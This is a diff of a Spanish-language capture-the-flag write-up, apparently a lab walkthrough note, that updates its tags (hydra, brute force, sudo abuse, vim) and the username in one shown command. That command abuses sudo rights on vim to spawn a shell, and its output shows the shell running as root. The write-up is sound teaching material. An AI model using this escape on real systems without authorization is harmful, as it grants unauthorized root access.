@@ -1,4 +1,4 @@
-#tag
+#hydra #password-brute-force #gtfobins #directory-brute-force #abusing-sudo #vim
 
 ![](../../../Images/Pasted%20image%2020241008071834.png)
 # Enumeración
@@ -141,7 +141,7 @@ Si investigamos en la página web de [GTFOBINS](https://gtfobins.github.io/) vem
 ![](../../../Images/Pasted%20image%2020241008162323.png)
 
 ```
-russoski@7646d085583b:~$ sudo /usr/bin/vim -c ':!/bin/sh'
+mario@91a9d6272033:~$ sudo /usr/bin/vim -c ':!/bin/sh'
 
 # whoami
 root
